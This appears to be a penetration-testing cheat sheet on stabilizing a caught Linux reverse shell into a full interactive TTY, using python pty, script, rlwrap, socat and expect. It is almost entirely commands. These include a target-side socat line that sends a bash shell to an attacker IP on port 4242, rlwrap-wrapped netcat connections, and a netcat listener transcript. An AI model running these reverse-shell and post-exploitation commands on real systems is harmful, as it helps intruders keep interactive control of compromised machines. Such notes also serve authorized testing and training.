# Linux

## 01 - Spawn TTY Shell

### 1.1.1 - Python

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z

user@pentestos:~$ echo $TERM && tput lines && tput cols
```

- In attacker machine for `/bin/bash`

```
user@pentestos:~$ stty raw -echo
user@pentestos:~$ fg
```

- In attacker machine for `/bin/zsh`

`user@pentestos:~$ stty raw -echo; fg`

```
$ reset
$ export SHELL=/bin/bash
```

- Display the terminal colors (You can skip this step if the shell is stabilized)

```
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

### 1.1.2 - Script

- This is a universal method for GNU/Linux and Unix-like operating systems

```
$ script -qc /bin/bash /dev/null
CTRL+Z

user@pentestos:~$ echo $TERM && tput lines && tput cols
```

- In attacker machine for `/bin/bash`

```
user@pentestos:~$ stty raw -echo
user@pentestos:~$ fg
```

- In attacker machine for `/bin/zsh`

```
user@pentestos:~$ stty raw -echo; fg

$ reset
$ export SHELL=/bin/bash
```

- Display the terminal colors (You can skip this step if the shell is stablized)

```
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

### 1.1.3 - Rlwrap

- Using the GNU readline wrapper with arrow keys. You can use this when using a normal reverse shell for penetrating Windows machine

`user@pentestos:~$ rlwrap nc 192.168.0.115 80`

`user@pentestos:~$ rlwrap -r -f . nc 192.168.0.115 4242`

- `-f .` will make rlwrap use the current history file as a completion word list.

- `-r` Put all words seen on input and output on the completion list.

### 1.1.4 - Socat

- Using `socat` to spawn a shell with interactive TTY

- **Attacker**

```
user@pentestos:~$ socat file:`tty`,raw,echo=0 tcp-listen:4242
```

- **Target**

`$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4242`

### 1.1.5 - Expect

Using `expect` to get a TTY

```bash
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
```

- **Output**

```
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:  mypassword
localhost ~ #
```

---
## References

- [Hacktricks: Shells Full TTYs](https://book.hacktricks.xyz/shells/shells/full-ttys)

- [ROPNOP: Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

- [Pentest Monkey: Post Exploitation Without a TTY](https://pentestmonkey.net/blog/post-exploitation-without-a-tty)

- [Enlace Hacktivista: Stabilizing reverse shells](https://enlacehacktivista.org/index.php?title=Stabilizing_reverse_shells)